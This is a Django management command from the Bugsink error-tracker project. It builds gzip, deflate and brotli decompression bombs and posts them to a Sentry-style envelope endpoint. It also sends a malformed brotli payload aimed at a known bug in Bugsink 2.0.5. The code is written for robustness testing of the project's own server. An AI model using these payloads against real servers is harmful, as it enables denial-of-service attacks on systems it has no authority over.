import io
import zlib
import os
import uuid
import brotli

import requests

from django.core.management.base import BaseCommand, CommandError
from bugsink.streams import WBITS_PARAM_FOR_GZIP, WBITS_PARAM_FOR_DEFLATE

from compat.dsn import get_envelope_url, get_header_value


KiB = 1024
MiB = 1024 * KiB
GiB = 1024 * MiB


class Command(BaseCommand):
    # Tool to send a decompression bomb in the sentry-compatible envelope format to a server to test its robustness.
    # Bugsink 2.0.4 and earlier are vulnerable to such attacks when brotli compression is used.
    # See https://github.com/bugsink/bugsink/pull/266

    help = "Send a decompresson bomb to test whether our live server is robust against such attacks."

    def add_arguments(self, parser):
        parser.add_argument("--dsn")
        parser.add_argument("--size", type=str, default="1GiB",)
        parser.add_argument("--compress", action="store", choices=["gzip", "deflate", "br"], default="br")

    def _parse_size(self, size_str):
        if size_str.endswith("G") or size_str.endswith("M") or size_str.endswith("K"):
            size_str = size_str + "iB"

        if size_str.endswith("GiB"):
            return int(size_str[:-3]) * GiB
        if size_str.endswith("MiB"):
            return int(size_str[:-3]) * MiB
        if size_str.endswith("KiB"):
            return int(size_str[:-3]) * KiB

        return int(size_str)

    def handle(self, *args, **options):
        compress = options['compress']
        size = self._parse_size(options['size'])

        if options['dsn'] is None:
            if os.environ.get("SENTRY_DSN"):
                dsn = os.environ["SENTRY_DSN"]
            else:
                raise CommandError(
                    "You must provide a DSN to send data to Sentry. Use --dsn or set SENTRY_DSN environment variable.")
        else:
            dsn = options['dsn']

        if size == -1:
            return self.send_random_data(dsn)

        self.send_to_server(dsn, size, compress)

    def send_random_data(self, dsn):
        # the string "random" is not actually random since it has emperically been determined to trigger a failing code
        # path in brotli decompression in Bugsin 2.0.5.

        headers = {
            "Content-Encoding": "br",
            "Content-Type": "application/json",
        }
        response = requests.post(
            get_envelope_url(dsn),
            headers=headers,
            data=b"random",
            timeout=100,
        )
        print("Server responded with status code %d" % response.status_code)
        print("Response content: %s" % response.content)

    def construct_br_bomb(self, header, size):
        construction_chunk_size = min(100 * MiB, size // 10)

        print("Constructing bomb of size %d bytes..." % size)

        brotli_compressor = brotli.Compressor()

        output_stream = io.BytesIO()
        output_stream.write(brotli_compressor.process(header))

        print("Constructing chunk of size %d bytes..." % construction_chunk_size)
        chunk = b'\x00' * construction_chunk_size

        chunk_count = size // construction_chunk_size
        for i in range(chunk_count):
            print("  Adding chunk %d of %d..." % (i, chunk_count))
            output_stream.write(brotli_compressor.process(chunk))

        remaining = size - (chunk_count * construction_chunk_size)
        if remaining > 0:
            print("  Adding final chunk")
            output_stream.write(brotli_compressor.process(b'\x00' * remaining))

        output_stream.write(brotli_compressor.finish())
        data_bytes = output_stream.getvalue()

        print("Bomb constructed, size is %d bytes." % len(data_bytes))
        return data_bytes

    def br_bomb(self, header, size):
        # no_bandit_expl utility-script for local consumtion only
        filename = "/tmp/br-bomb-%d" % size  # nosec B108
        if os.path.exists(filename):
            with open(filename, "rb") as f:
                data_bytes = f.read()
            print("Using cached bomb %s of size %d bytes." % (filename, len(data_bytes)))
            return data_bytes

        data_bytes = self.construct_br_bomb(header, size)
        with open(filename, "wb") as f:
            f.write(data_bytes)

        return data_bytes

    def construct_zlib_bomb(self, header, size, wbits):
        construction_chunk_size = min(100 * MiB, size // 10)

        print("Constructing bomb of size %d bytes..." % size)

        zlib_compressor = zlib.compressobj(level=9, wbits=wbits)

        output_stream = io.BytesIO()
        output_stream.write(zlib_compressor.compress(header))

        print("Constructing chunk of size %d bytes..." % construction_chunk_size)
        chunk = b'\x00' * construction_chunk_size

        chunk_count = size // construction_chunk_size
        for i in range(chunk_count):
            print("  Adding chunk %d of %d..." % (i, chunk_count))
            output_stream.write(zlib_compressor.compress(chunk))

        remaining = size - (chunk_count * construction_chunk_size)
        if remaining > 0:
            print("  Adding final chunk")
            output_stream.write(zlib_compressor.compress(b'\x00' * remaining))

        output_stream.write(zlib_compressor.flush())
        data_bytes = output_stream.getvalue()

        print("Bomb constructed, size is %d bytes." % len(data_bytes))
        return data_bytes

    def zlib_bomb(self, header, size, wbits):
        algo = "gzip" if wbits == WBITS_PARAM_FOR_GZIP else "deflate"
        filename = "/tmp/%s-bomb-%d" % (algo, size)  # nosec B108

        if os.path.exists(filename):
            with open(filename, "rb") as f:
                data_bytes = f.read()
            print("Using cached bomb %s of size %d bytes." % (filename, len(data_bytes)))
            return data_bytes

        data_bytes = self.construct_zlib_bomb(header, size, wbits)
        with open(filename, "wb") as f:
            f.write(data_bytes)

        return data_bytes

    def send_to_server(self, dsn, size, compress):
        headers = {
            "Content-Type": "application/json",
            "X-Sentry-Auth": get_header_value(dsn),
        }

        event_id = uuid.uuid4().hex

        # the smallest possible envelope:
        header_bytes = (b'{"event_id":"%s"' % event_id.encode("utf-8") + b'}\n'
                        b'{"type":"attachment", "attachment_type": "event.minidump", "length": %d, ' % size +
                        b'"filename": "bomb.dmp"}\n')

        if compress == "br":
            headers["Content-Encoding"] = "br"

            compressed_data = self.br_bomb(header_bytes, size)

            response = requests.post(
                get_envelope_url(dsn),
                headers=headers,
                data=compressed_data,
                timeout=100,
            )

        elif compress in ["gzip", "deflate"]:
            if compress == "gzip":
                headers["Content-Encoding"] = "gzip"
                wbits = WBITS_PARAM_FOR_GZIP
            elif compress == "deflate":
                headers["Content-Encoding"] = "deflate"
                wbits = WBITS_PARAM_FOR_DEFLATE

            compressed_data = self.zlib_bomb(header_bytes, size, wbits)

            response = requests.post(
                get_envelope_url(dsn),
                headers=headers,
                data=compressed_data,
                timeout=100,
            )

        else:
            raise Exception("Unsupported compression method: %s" % compress)

        print("Server responded with status code %d" % response.status_code)
        print("Response content: %s" % response.content)
